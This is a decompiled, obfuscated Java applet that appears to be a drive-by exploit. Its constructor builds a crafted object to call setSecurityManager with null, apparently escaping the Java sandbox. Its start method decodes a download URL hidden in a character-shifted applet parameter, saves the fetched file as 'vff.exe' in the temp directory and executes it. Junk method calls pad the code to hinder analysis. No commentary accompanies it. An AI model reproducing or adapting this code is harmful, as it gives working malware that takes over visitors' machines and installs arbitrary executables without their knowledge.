import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Goo extends Applet
{
    String popo;
    JList npwow;
    
    private void mopmg() {
    }
    
    @Override
    public void start() {
        super.start();
        try {
            this.mopmg();
            String lmopaa = System.getProperty("jalkjhgdva.ilkjhgdo.tlkjhgdmpdlkjhgdir".replace("lkjhgd", ""));
            this.mopmg();
            if (lmopaa.charAt(lmopaa.length() - 1) != '\\') {
                lmopaa += "\\";
            }
            this.mopmg();
            final String coopl = lmopaa + "vflkjhgdf.exlkjhgde".replace("lkjhgd", "");
            this.mopmg();
            this.mopmg();
            final String poiuhgfr = this.getParameter("deoi33fyyyst".replace("oi33fyyy", ""));
            this.mopmg();
            String dpoiuhgfr = "";
            this.mopmg();
            for (int s = 0; s < poiuhgfr.length(); ++s) {
                int jds = poiuhgfr.charAt(s);
                jds -= 4;
                dpoiuhgfr += (char)jds;
            }
            this.mopmg();
            this.mopmg();
            final InputStream klsgowl = Sopil.MOP(dpoiuhgfr);
            this.mopmg();
            final int afqw = 0;
            this.mopmg();
            final FileOutputStream ggpw = new FileOutputStream(coopl);
            this.mopmg();
            byte[] llmopaa = new byte[153601];
            this.mopmg();
            int dshs = 0;
            this.mopmg();
            int hshwh3 = 0;
            this.mopmg();
            this.mopmg();
            while ((hshwh3 = klsgowl.read(llmopaa)) > 0) {
                ggpw.write(llmopaa, 0, hshwh3);
                this.mopmg();
                llmopaa = new byte[153601];
                this.mopmg();
                dshs += hshwh3;
                this.mopmg();
            }
            this.mopmg();
            ggpw.close();
            this.mopmg();
            klsgowl.close();
            this.mopmg();
            try {
                this.mopmg();
                Sopil.LksLL(coopl);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    private void npkng() {
        Boolean n = true;
        if (n) {
            n = false;
        }
    }
    
    public Goo() {
        final Object oiuyg = System.class;
        this.npkng();
        final String kjhgfd = "spoiuyt4etpoiuyt4Securpoiuyt4ityMapoiuyt4napoiuyt4ger".replace("poiuyt4", "");
        this.npkng();
        final Object[] lmopaad = { null };
        this.npkng();
        final Object[] da = { null };
        this.npkng();
        this.npkng();
        final Sjyaw bcv = new Sjyaw(oiuyg, kjhgfd, lmopaad);
        this.npkng();
        final HashSet a = new HashSet();
        this.npkng();
        a.add(bcv);
        this.npkng();
        final int kjhgf = 33;
        this.npkng();
        final Map oiuhg = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        this.npkng();
        this.npwow = new JList((E[])new Object[] { oiuhg });
        this.npkng();
        this.add(this.npwow);
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
